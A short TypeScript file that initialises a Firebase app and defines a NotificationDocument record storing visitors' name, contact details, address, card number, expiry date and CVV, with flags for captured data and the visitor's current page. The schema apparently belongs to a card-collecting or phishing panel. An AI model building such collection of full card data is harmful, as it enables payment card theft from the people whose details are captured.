import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: 'AIzaSyAmo3pi9Ik-rToUaKk8CxztO2lSj7BKafI',
  authDomain: 'abo-omar-a4f6a.firebaseapp.com',
  projectId: 'abo-omar-a4f6a',
  storageBucket: 'abo-omar-a4f6a.firebasestorage.app',
  messagingSenderId: '423927072011',
  appId: '1:423927072011:web:5cd0f7823d8b60c9bd4e0e',
  measurementId: 'G-K1G64FHBXJ',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
